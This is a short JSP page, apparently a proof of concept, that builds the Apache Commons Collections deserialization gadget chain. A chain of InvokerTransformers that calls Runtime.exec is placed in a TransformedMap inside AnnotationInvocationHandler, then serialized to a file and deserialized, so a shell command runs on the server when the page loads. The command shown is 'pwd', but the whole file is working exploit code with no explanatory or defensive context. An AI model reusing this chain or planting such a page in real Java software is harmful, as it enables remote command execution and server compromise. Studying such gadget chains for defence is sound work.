<%@ page import="org.apache.commons.collections4.Transformer" %>
<%@ page import="org.apache.commons.collections4.functors.ConstantTransformer" %>
<%@ page import="org.apache.commons.collections4.functors.InvokerTransformer" %>
<%@ page import="org.apache.commons.collections4.functors.ChainedTransformer" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.commons.collections4.map.TransformedMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.annotation.Retention" %>
<%@ page import="java.io.*" %>
<%
    String cmd = "pwd";

    Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                    new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                    new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
    };

    Transformer transformerChain = new ChainedTransformer(transformers);

    Map innermap = new HashMap();
    innermap.put("value", "value");
    Map outmap = TransformedMap.transformingMap(innermap, null, transformerChain);
    Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
    ctor.setAccessible(true);
    Object instance = ctor.newInstance(Retention.class, outmap);
    File f = new File("obj");
    ObjectOutputStream outStream = new ObjectOutputStream(new FileOutputStream(f));
    outStream.writeObject(instance);
    outStream.flush();
    outStream.close();
    ObjectInputStream in = new ObjectInputStream(new FileInputStream("obj"));
    in.readObject();
    in.close();
%>
